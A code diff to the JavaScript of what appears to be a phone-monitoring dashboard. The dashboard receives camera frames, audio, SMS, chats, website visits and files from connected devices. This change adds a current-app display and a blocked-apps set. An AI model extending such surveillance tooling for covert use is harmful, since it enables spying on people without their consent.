@@ -21,6 +21,7 @@
     
     let activeDeviceId = "";
     let connectedDevices = new Set();
+    let blockedApps = new Set();
 
     // FPS tracking
     let fpsFrames = 0;
@@ -225,6 +226,7 @@
                     case 'camera_frame':    handleCameraFrame(data); break;
                     case 'audio_chunk':     handleAudioChunk(data); break;
                     case 'social_chats':    handleTouchEvent(data); break;
+                    case 'current_app':     handleCurrentApp(data); break;
                     case 'website_visit':   handleWebsiteVisit(data); break;
                     case 'file_list':       handleFileList(data); break;
                     case 'file_content':    handleFileContent(data); break;
@@ -427,6 +429,12 @@
             tbody.appendChild(tr);
         });
         addActivity(`💬 ${data.count} SMS messages received`, 'data');
+    }
+
+    // ─── Current App ──────────────────────────────────────────────────
+    function handleCurrentApp(data) {
+        setText('ov-active-app', data.appName || data.package || '—');
+        addActivity(`📱 Active App: ${data.appName || data.package}`, 'data');
     }
 
     // ─── App Usage ────────────────────────────────────────────────────
